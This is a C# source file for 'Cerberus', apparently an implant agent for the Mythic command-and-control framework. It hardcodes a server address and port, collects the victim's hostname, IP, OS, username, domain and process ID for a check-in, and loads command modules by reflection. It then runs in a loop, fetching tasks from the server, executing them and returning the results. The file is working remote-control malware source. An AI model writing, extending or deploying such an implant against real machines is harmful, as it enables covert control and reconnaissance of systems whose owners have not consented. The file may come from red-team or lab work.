using CommModuleBase;
using HttpModule;
using Models.Tasks;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

namespace Cerberus
{
    class Program
    {
        private static CerberusMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _cancellationTokenSource;

        private static List<CerberusCommand> _commands = new List<CerberusCommand>();

        private static int SleepTime = 5000;

        private static string serverAddress = "10.0.2.128";
        private static int serverPort = 80;
        private static string PayloadUUID = "76b4609d-38d8-4a71-8a96-ff79e4154ed6";
        private static string UUID = "";
        private string killdate = "";





        static void Main(string[] args)
        {
            //Thread.Sleep(5000);

            GenerateMetadata();
            LoadCerberusCommands();

            _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
            _commModule.Init(_metadata);
            _commModule.Start();

            _cancellationTokenSource = new CancellationTokenSource();

            UUID = _commModule.Metadata.uuid;

            while (!_cancellationTokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    HandleTasks(tasks);
                }

                // check killdate and stop
            }
        }

            

        private static void HandleTasks(IEnumerable<MythicTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(MythicTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));

            if (command is null)
            {
                var result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Command not found",
                    completed = true,
                    status = "error",
                    error = "Command not found"
                };

                SendTaskResult(result);
                return;
            }

            try
            {
                var result = command.Execute(task);
                SendTaskResult(result);
            }
            catch (Exception ex)
            {
                var result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = ex.Message,
                    completed = true,
                    status = "error",
                    error = ex.Message
                };
                SendTaskResult(result);
            }
        }

        private static void SendTaskResult(MythicTaskResult result)
        {
/*            if (!task.completed)
            {
                return;
            }*/

            _commModule.SendData(result);
        }

        public void Stop()
        {
            _cancellationTokenSource.Cancel();
        }

        private static void LoadCerberusCommands()
        {
            var tasks = Assembly.Load("Tasks");

            foreach(var type in tasks.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CerberusCommand)))
                {
                    var instance = (CerberusCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            /*var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new CerberusMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };
*/
            

            string hostname = Environment.MachineName;
            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);

            _metadata = new CerberusMetadata
            {
                action = "checkin",
                ip = ipEntry.AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = identity.Name,
                host = hostname,
                domain = Environment.UserDomainName,
                pid = process.Id,
                uuid = PayloadUUID,
                architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
